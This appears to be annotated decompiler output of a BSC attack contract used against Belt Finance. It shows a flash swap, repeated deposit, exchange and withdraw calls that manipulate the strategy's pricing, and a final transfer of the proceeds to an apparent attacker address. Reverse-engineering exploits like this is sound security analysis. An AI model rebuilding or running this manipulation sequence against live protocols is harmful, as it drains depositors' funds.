#
#  Panoramix v4 Oct 2019 
#  Decompiled source of bsc:0x4eB362934D56f2669a712Cb92d316cd465921B5D
# 
#  Let's make the world open source 
# 

def storage:
    address tokenA # storage 3
    address tokenC # storage 5
    Union[list, address] listOrTokenB # storage 9
    address UniswapV2Factory # storage 10
    address UniswapV2Router # storage 11
    address BeltSwapRouterV1 # storage 12
    address SingleStrategyTokenImpl # storage 15
    uint256 depositValue # storage 16 - value: 11324882507324218750
    uint256 iterationLimit # storage 17 - value: 7
    address transferTarget # storage 18 -> might be attacker address

def getToken(address _contract, uint256 _tokenId) payable:
    # 0xb6f9de95
    UniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens(
        _tokenId,
        [...], # Array(len=2, data=mem[356 len 64])
        msg.sender,
        block.timestamp + (240 * 24 * 3600),
    ) msg.value

# this function initiates attack
def attack_6add6bd6(
    uint256 _depositValue, # passed during deposit() method of Belt Finance strategy contract
    uint256 _iterationLimit, # limit of iteration, attack was repeating in the loop
): # not payable
    
    depositValue = _depositValue # value: 11324882507324218750
    iterationLimit = _iterationLimit # value: 7
    
    # 0xe6a43905
    pair = UniswapV2Factory.getPair(tokenA, tokenB)
    
    #
    # Retrieved by reversing 4byte process
    # First 4 bytes of following Solidity code
    #
    # function test(string memory y) public pure returns (bytes32) {
    #    return keccak256(abi.encodePacked(y));
    # }
    #
    # 0x0902f1ac
    res0, res1, ts = pair.getReserves()
    
    # 0xd21220a7
    tokenFromPair = pair.token1()
    
    # tokenA != ext_call.return_data[12 len 20]
    if tokenA != tokenFromPair:
        
        # 0x22c0d9f
        # args 
        # Mask(112, 0, ext_call.return_dataaddr(this.address), 
        # 128, 
        # 96, 
        # stor3, 
        # Mask(112, 0, ext_call.return_data[0]) - 1, 
        # 1
        pair.swap(
            uint256, 
            uint256, 
            tokenA, 
            bytes,
        )
    
    else:
        
        # 0x22c0d9f
        # args 
        # 0, 
        # Mask(112, 0, ext_call.return_dataaddr(this.address), 
        # 128, 
        # 96, 
        # stor3, 
        # Mask(112, 0, ext_call.return_data[32]) - 1, 
        # 1
        pair.swap(
            uint256, 
            uint256, 
            tokenA, 
            bytes,
        )
    
    # 0x70a08231
    balance = tokenA.balanceOf(this.address)
    
    # a9059cbb
    tokenA.transfer(transferTarget, balance)

def unknown84800812(): # not payable
    # calldata
    #
    # require calldata.size - 4 >= 128
    # require cd <= 4294967296
    # require cd <= calldata.size
    # require ('cd', 100).length <= 4294967296 and cd('cd', 100).length + 36 <= calldata.size
        
    require('pancakeCall sender == this')
    # require ('cd', 100).length >= 96
    require('calldata', 100)
    
    if ('calldata', 100) < listOrTokenB.length
        
        # 0xe6a43905
        # stor9[('cd', 100)]
        pair = UniswapV2Factory.getPair(tokenA, listOrTokenB[('calldata', 100)])
        
        # 0x0902f1ac
        res0, res1, ts = pair.getReserves()

        # 0xd21220a7
        tokenFromPair = pair.token1()

        # tokenA != ext_call.return_data[12 len 20]
        if tokenA != tokenFromPair

            # 0x22c0d9f
            #
            # args 
            # Mask(112, 0, ext_call.return_dataaddr(this.address), 
            # 128, 
            # 96, 
            # stor3, 
            # Mask(112, 0, ext_call.return_data('cd', 100) + 1
            pair.swap(
                uint256, 
                uint256, 
                tokenA, 
                bytes,
            )

        else:

            # 0x22c0d9f
            #
            # args 
            # 0, 
            # Mask(112, 0, ext_call.return_dataaddr(this.address), 
            # 128, 
            # 96, 
            # stor3, 
            # Mask(112, 0, ext_call.return_data('cd', 100) + 1
            pair.swap(
                uint256, 
                uint256, 
                tokenA, 
                bytes,
            )

    else:
        
        # 0x095ea7b3
        tokenA.approve(SingleStrategyTokenImpl, -1)

        # 0x095ea7b3
        tokenA.approve(BeltSwapRouterV1, -1)

        # 0x095ea7b3
        tokenC.approve(BeltSwapRouterV1, -1)

        # 0x687d83dd
        some_address = SingleStrategyTokenImpl.0x687d83dd()

        # 0x2ec2ddd12566b66f4da248b1ecdee8619b5c56cd
        if some_address == bEllipsisBUSD

            # 0xe2bbb158
            SingleStrategyTokenImpl.deposit(10000000 * 10^18, 0)
        
        i = 0
        while i < iterationLimit:

            # 0x70a08231
            balance = tokenA.balanceOf(this.address)
            
            # 0xe2bbb158
            SingleStrategyTokenImpl.deposit(depositValue, 0)

            # 0x70a08231
            balance = tokenA.balanceOf(this.address)

            # 0x3df02124
            BeltSwapRouterV1.exchange(0, 2, balance, 0)

            # 0x70a08231
            balance = SingleStrategyTokenImpl.balanceOf(this.address)

            # 0x441a3e70
            SingleStrategyTokenImpl.withdraw(balance, 0)

            # 0x70a08231
            balance = tokenC.balanceOf(this.address)

            # memory
            #
            # mem[96] = 0x3df0212400000000000000000000000000000000000000000000000000000000
            # mem[100] = 2
            # mem[132] = 0
            # mem[164] = ext_call.return_data[0]
            # mem[196] = 0

            # 0x3df02124
            BeltSwapRouterV1.exchange(2, 0, balance, 0)

            i++

    # a9059cbb
    # call addr(('cd', 100))
    # ('cd', 100) + (3 * ('cd', 100) / 997) + 1
    calldata.transfer(msg.sender, calldata)
